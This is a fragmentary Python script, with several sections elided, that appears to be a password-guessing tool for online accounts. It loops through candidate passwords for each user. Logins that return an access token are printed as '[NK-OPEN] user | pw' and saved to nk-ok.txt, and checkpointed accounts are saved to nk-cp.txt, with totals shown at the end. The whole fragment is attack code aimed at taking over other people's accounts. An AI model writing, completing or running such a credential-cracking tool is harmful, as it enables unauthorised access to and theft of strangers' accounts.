...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mNK-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mNK-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
class __bsn__:
    ...
    def bilo(self,id):
        ...
        logo()
        print("")
        input('%s  DO YOU WANT TO CONTINUE :%s '%(P,K))
        ___worldwide___ = ('y')
    ...
    def __api__(self, user, __chi__):
        ...
        for pw in __chi__:
            ...
            if "access_token" in p:
                print('\r [NK-OPEN] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('nk-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[NK-CHECK] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('nk-cp.txt' , 'a').write('%s\n' % wrt)
                    break
